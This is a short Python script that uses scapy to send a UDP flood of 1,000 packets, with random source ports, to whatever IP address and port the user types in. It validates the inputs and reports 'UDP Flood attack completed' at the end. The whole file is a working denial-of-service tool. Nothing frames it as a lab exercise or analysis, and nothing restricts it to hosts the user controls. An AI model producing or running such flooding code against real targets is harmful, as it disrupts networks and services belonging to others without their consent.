import socket
from scapy.all import IP, UDP, send, RandShort

def is_valid_ipv4_address(address):
    try:
        socket.inet_pton(socket.AF_INET, address)
        return True
    except AttributeError:  # inet_pton not available on Windows
        try:
            socket.inet_aton(address)
        except socket.error:
            return False
        return address.count('.') == 3
    except socket.error:  # not a valid address
        return False

def udp_flood(target_ip, target_port, num_packets):
    for i in range(num_packets):
        packet = IP(dst=target_ip) / UDP(dport=target_port, sport=RandShort())
        send(packet, verbose=0)
        if (i + 1) % 100 == 0:
            print(f"Sent {i + 1} packets...")
    print(f"UDP Flood attack completed on {target_ip}:{target_port} with {num_packets} packets.")

if __name__ == "__main__":
    TARGET_IP = input("Enter the target IP address: ")
    TARGET_PORT = input("Enter the target port: ")

    if is_valid_ipv4_address(TARGET_IP):
        try:
            TARGET_PORT = int(TARGET_PORT)
            if 1 <= TARGET_PORT <= 65535:
                NUMBER_OF_PACKETS = 1000
                udp_flood(TARGET_IP, TARGET_PORT, NUMBER_OF_PACKETS)
            else:
                print("Invalid port number. Please enter a number between 1 and 65535.")
        except ValueError:
            print("Invalid port format. Please enter a numeric value.")
    else:
        print("Invalid IP address format.")

